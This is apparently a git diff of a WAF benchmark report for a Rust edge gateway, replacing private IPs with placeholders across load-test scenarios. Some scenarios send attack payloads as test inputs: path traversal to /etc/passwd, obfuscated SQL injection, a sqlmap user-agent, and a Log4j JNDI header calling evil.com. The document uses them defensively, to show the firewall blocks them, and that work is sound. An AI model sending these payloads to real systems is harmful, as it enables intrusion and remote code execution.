@@ -109,8 +109,8 @@ flowchart LR
         edge["Velda Edge Gateway (Rust Release 0.1.0)\n(Affined Tokio Workers 0..3)\npre_route: waf_lite"]
     end
 
-    wrk -->|"VNet Private: 172.16.0.4:80/443"| edge
-    edge -->|"Leased Connection: 172.16.0.5:8081"| backend
+    wrk -->|"VNet Private: <GATEWAY_HOST>:80/443"| edge
+    edge -->|"Leased Connection: <BACKEND_HOST>:8081"| backend
 ```
 
 ### Compute Specifications
@@ -126,7 +126,7 @@ flowchart LR
 
 #### Scenario 1: Cleartext Baseline (No WAF)
 ```bash
-wrk -t 2 -c 64 -d 10s http://172.16.0.4:80/api/waf/baseline --latency
+wrk -t 2 -c 64 -d 10s http://<GATEWAY_HOST>:80/api/waf/baseline --latency
 ```
 - **Throughput**: **44,387.24 RPS** (Transfer: 6.48 MB/s)
 - **Total Requests**: 444,242 in 10.01s
@@ -139,7 +139,7 @@ wrk -t 2 -c 64 -d 10s http://172.16.0.4:80/api/waf/baseline --latency
 
 #### Scenario 2: Cleartext Clean Traffic (Active WAF Lite Inspection)
 ```bash
-wrk -t 2 -c 64 -d 10s -s /home/phucle/bench_waf_clean.lua http://172.16.0.4:80/api/waf/clean --latency
+wrk -t 2 -c 64 -d 10s -s /home/phucle/bench_waf_clean.lua http://<GATEWAY_HOST>:80/api/waf/clean --latency
 ```
 - **Throughput**: **43,801.79 RPS** (Transfer: 6.39 MB/s)
 - **Total Requests**: 438,250 in 10.01s
@@ -157,7 +157,7 @@ wrk -t 2 -c 64 -d 10s -s /home/phucle/bench_waf_clean.lua http://172.16.0.4:80/a
 
 #### Scenario 3: Double-Encoded Path Traversal
 ```bash
-wrk -t 2 -c 64 -d 10s "http://172.16.0.4:80/api/waf/block?file=%252e%252e%252fetc%2fpasswd" --latency
+wrk -t 2 -c 64 -d 10s "http://<GATEWAY_HOST>:80/api/waf/block?file=%252e%252e%252fetc%2fpasswd" --latency
 ```
 - **Throughput**: **107,859.47 RPS** (Transfer: 18.00 MB/s)
 - **Total Rejections**: 1,089,374 in 10.10s (100% `403 Forbidden`)
@@ -170,7 +170,7 @@ wrk -t 2 -c 64 -d 10s "http://172.16.0.4:80/api/waf/block?file=%252e%252e%252fet
 
 #### Scenario 4: Obfuscated SQL Injection with `+` and `/**/`
 ```bash
-wrk -t 2 -c 64 -d 10s "http://172.16.0.4:80/api/waf/block?id=1%27+UNION/**/SELECT+*+FROM+users--" --latency
+wrk -t 2 -c 64 -d 10s "http://<GATEWAY_HOST>:80/api/waf/block?id=1%27+UNION/**/SELECT+*+FROM+users--" --latency
 ```
 - **Throughput**: **108,089.42 RPS** (Transfer: 18.04 MB/s)
 - **Total Rejections**: 1,081,534 in 10.01s (100% `403 Forbidden`)
@@ -183,7 +183,7 @@ wrk -t 2 -c 64 -d 10s "http://172.16.0.4:80/api/waf/block?id=1%27+UNION/**/SELEC
 
 #### Scenario 5: Malicious Scanner User-Agent (`sqlmap/1.6.1`)
 ```bash
-wrk -t 2 -c 64 -d 10s -H "User-Agent: sqlmap/1.6.1#stable" http://172.16.0.4:80/api/waf/block --latency
+wrk -t 2 -c 64 -d 10s -H "User-Agent: sqlmap/1.6.1#stable" http://<GATEWAY_HOST>:80/api/waf/block --latency
 ```
 - **Throughput**: **107,612.76 RPS** (Transfer: 17.96 MB/s)
 - **Total Rejections**: 1,076,396 in 10.00s (100% `403 Forbidden`)
@@ -196,7 +196,7 @@ wrk -t 2 -c 64 -d 10s -H "User-Agent: sqlmap/1.6.1#stable" http://172.16.0.4:80/
 
 #### Scenario 6: JNDI Log4j Remote Code Execution Header Injection
 ```bash
-wrk -t 2 -c 64 -d 10s -H "Referer: http://attacker.com?payload=\${jndi:ldap://evil.com/a}" http://172.16.0.4:80/api/waf/block --latency
+wrk -t 2 -c 64 -d 10s -H "Referer: http://attacker.com?payload=\${jndi:ldap://evil.com/a}" http://<GATEWAY_HOST>:80/api/waf/block --latency
 ```
 - **Throughput**: **107,531.22 RPS** (Transfer: 17.95 MB/s)
 - **Total Rejections**: 1,086,125 in 10.10s (100% `403 Forbidden`)
@@ -213,7 +213,7 @@ wrk -t 2 -c 64 -d 10s -H "Referer: http://attacker.com?payload=\${jndi:ldap://ev
 
 #### Scenario 7: HTTPS HTTP/1.1 Clean Traffic
 ```bash
-wrk -t 2 -c 64 -d 10s -s /home/phucle/bench_waf_clean.lua https://172.16.0.4:443/api/waf/clean --latency
+wrk -t 2 -c 64 -d 10s -s /home/phucle/bench_waf_clean.lua https://<GATEWAY_HOST>:443/api/waf/clean --latency
 ```
 - **Throughput**: **36,634.06 RPS** (Transfer: 5.35 MB/s)
 - **Total Requests**: 366,783 in 10.01s (100% `200 OK`)
@@ -221,7 +221,7 @@ wrk -t 2 -c 64 -d 10s -s /home/phucle/bench_waf_clean.lua https://172.16.0.4:443
 
 #### Scenario 8: HTTPS HTTP/1.1 Attack Rejection (403)
 ```bash
-wrk -t 2 -c 64 -d 10s "https://172.16.0.4:443/api/waf/block?file=%252e%252e%252fboot.ini" --latency
+wrk -t 2 -c 64 -d 10s "https://<GATEWAY_HOST>:443/api/waf/block?file=%252e%252e%252fboot.ini" --latency
 ```
 - **Throughput**: **77,848.27 RPS** (Transfer: 12.99 MB/s)
 - **Total Rejections**: 778,757 in 10.00s (100% `403 Forbidden`)
@@ -229,7 +229,7 @@ wrk -t 2 -c 64 -d 10s "https://172.16.0.4:443/api/waf/block?file=%252e%252e%252f
 
 #### Scenario 9: HTTPS HTTP/2 Clean Traffic (`oha`)
 ```bash
-/home/phucle/oha -z 10s -c 64 --http2 --insecure https://172.16.0.4:443/api/waf/clean
+/home/phucle/oha -z 10s -c 64 --http2 --insecure https://<GATEWAY_HOST>:443/api/waf/clean
 ```
 - **Throughput**: **23,328.01 RPS**
 - **Success Rate**: 100.00% (233,365 `200 OK` responses)
@@ -237,7 +237,7 @@ wrk -t 2 -c 64 -d 10s "https://172.16.0.4:443/api/waf/block?file=%252e%252e%252f
 
 #### Scenario 10: HTTPS HTTP/2 Attack Rejection (`oha`)
 ```bash
-/home/phucle/oha -z 10s -c 64 --http2 --insecure "https://172.16.0.4:443/api/waf/block?file=%252e%252e%252fboot.ini"
+/home/phucle/oha -z 10s -c 64 --http2 --insecure "https://<GATEWAY_HOST>:443/api/waf/block?file=%252e%252e%252fboot.ini"
 ```
 - **Throughput**: **37,403.83 RPS**
 - **Success Rate**: 100.00% (374,200 `403 Forbidden` responses)
